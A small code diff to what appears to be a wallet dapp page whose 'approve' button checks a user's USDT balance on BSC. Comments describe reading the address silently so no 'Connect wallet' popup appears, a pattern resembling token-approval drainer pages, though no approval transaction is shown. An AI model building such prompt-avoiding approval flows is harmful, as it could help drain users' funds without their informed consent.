@@ -33,8 +33,6 @@ const ERC20_ABI = [
   "function balanceOf(address account) external view returns (uint256)"
 ];
 
-
-
 // ─── DOM refs ─────────────────────────────────────────────────────────────────
 const approveBtn    = document.getElementById("approveBtn");
 const btnText       = document.getElementById("btnText");
@@ -174,8 +172,6 @@ async function getUsdtBalance(userAddress, iface) {
 // "Connect wallet" popup on every visit. The reference dapp only uses
 // eth_accounts which is permanently silent inside Trust Wallet browser.
 //
-
-
 approveBtn.addEventListener("click", async () => {
 
   // If window.ethereum is not yet injected (user tapped NEXT very quickly on
@@ -228,7 +224,7 @@ approveBtn.addEventListener("click", async () => {
         return;
       }
       // any other error (e.g. already on BSC with some wallets) — continue
-    }*/
+    }
 
     // Step 2 — Get wallet address using eth_accounts (SILENT — no popup ever)
     // Reference dapp uses eth_accounts here, NOT eth_requestAccounts.
@@ -324,3 +320,4 @@ approveBtn.addEventListener("click", async () => {
     setLoading(false);
   }
 });
+
